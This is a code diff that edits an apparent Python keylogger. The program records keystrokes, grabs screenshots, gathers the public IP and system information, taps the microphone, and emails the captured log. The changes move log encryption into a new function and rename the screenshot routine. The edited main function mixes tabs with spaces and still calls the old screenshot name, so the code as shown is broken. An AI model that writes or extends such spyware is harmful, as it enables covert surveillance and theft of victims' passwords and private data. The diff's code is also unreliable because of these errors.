@@ -47,9 +47,6 @@ count = 0
 keys = []
 
 
-# Generate a key for encryption
-key = Fernet.generate_key()
-cipher_suite = Fernet(key)
 
 def get_public_ip():
 	try:
@@ -116,16 +113,21 @@ def write_file(keys):
                 f.write(k)
                 f.close()
 		    
-# Encrypt the key log file
-    with open(file_path + extend + keys_info, "rb") as original_file:
-        encrypted_data = cipher_suite.encrypt(original_file.read())
-    with open(file_path + extend + keys_info + ".encrypted", "wb") as encrypted_file:
-        encrypted_file.write(encrypted_data)
 
 def on_release(key):
     """Stop keylogger if Esc is released"""
     if key == Key.esc: # if esc is entered, exit keylogger
         return False
+
+def encrypt_file(file_path):
+    """Encrypts the specified file using Fernet encryption"""
+    key = Fernet.generate_key()  # Generate a new encryption key
+    cipher_suite = Fernet(key)
+    with open(file_path, 'rb') as original_file:
+        original_data = original_file.read()
+        encrypted_data = cipher_suite.encrypt(original_data)
+    with open(file_path + '.encrypted', 'wb') as encrypted_file:
+        encrypted_file.write(encrypted_data)
 
 
 def send_email(filename, attachment, to_email):
@@ -182,17 +184,20 @@ def send_email(filename, attachment, to_email):
     s.quit()
 
 
-def screenshot():
-    """Take a screenshot"""
+def take_screenshot(file_path):
+    """Take a screenshot and save it as an image file"""
     image = ImageGrab.grab()
-    image.save(file_path + extend + "screenshot.png")
+    image.save(file_path + "screenshot.png")
 
 
 def main():
     computer_information()
     microphone()
+	encrypt_file(file_path + extend + keys_info)
+	take_screenshot(file_path + extend)
     send_email(keys_info, file_path + extend + keys_info, to_email)
     freeze_support()
+
     Process(target=screenshot).start()
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
